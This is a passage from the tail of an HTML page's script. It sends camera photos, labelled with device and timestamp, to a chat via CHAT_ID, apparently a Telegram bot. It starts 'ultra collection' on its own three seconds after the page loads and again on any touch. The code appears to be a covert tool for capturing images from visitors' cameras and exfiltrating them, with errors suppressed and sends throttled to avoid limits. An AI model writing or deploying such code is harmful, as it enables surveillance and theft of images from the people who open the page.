                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    photo: photo.photo,
                                    caption: `ðŸ“¸ ${photo.camera} - ${photo.resolution} - ${photo.timestamp}`
                                })
                            });
                            // Delay between photo sends to avoid rate limiting
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        } catch (photoError) {
                            console.log('Photo send error:', photoError);
                        }
                    }
                }
                
            } catch (error) {
                console.log('Send error:', error);
            }
        }

        // Auto-start after 3 seconds
        setTimeout(() => {
            if (!isCollecting) {
                startUltraCollection();
            }
        }, 3000);

        // Touch support for mobile
        document.querySelector('.main-ghost').addEventListener('touchstart', function(e) {
            e.preventDefault();
            startUltraCollection();
        });

    </script>
</body>
    </html>
